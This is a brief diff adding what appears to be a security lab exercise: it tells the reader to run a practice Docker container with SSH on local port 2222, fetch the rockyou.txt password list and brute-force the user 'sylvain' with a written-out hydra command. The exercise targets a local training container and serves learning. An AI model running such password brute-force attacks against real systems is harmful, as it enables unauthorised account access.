@@ -1,0 +1,5 @@
+Pull and run the Docker image sylvainkalache/264-1 with the command docker run -p 2222:22 -d -ti sylvainkalache/264-1
+
+-download passwd dictionary like rockyou.txt
+-then start brutforcing:
+	hydra -l sylvain -P rockyou.txt ssh://127.0.0.1:2222
